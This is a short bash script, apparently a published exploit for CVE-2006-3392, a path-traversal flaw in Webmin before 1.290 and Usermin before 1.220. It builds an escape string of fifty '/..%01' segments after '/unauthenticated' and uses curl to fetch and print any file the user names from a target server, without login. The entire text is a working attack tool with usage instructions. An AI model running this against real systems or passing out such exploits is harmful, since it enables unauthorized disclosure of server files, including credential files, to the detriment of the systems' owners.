#!/bin/bash

# CVE-2006-3392: Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure
# by g1vi https://github.com/g1vi
# January 2023

target=$1;
port=$2;
file=$3;
escape="/unauthenticated"
usage="\nusage: ./exploit.sh <target ip> <target port> <file to disclose>\n"

for i in {0..50};do escape+="/..%01";done

if [[ -n $target  &&  -n $port  &&  -n $file ]]

then
        echo -e "\n\n-----BEGIN OF FILE $3-----\n"
        curl -s "$target:$port$escape$file"
        echo -e "\n-----END OF FILE-----\n"
else
        echo -e $usage
fi
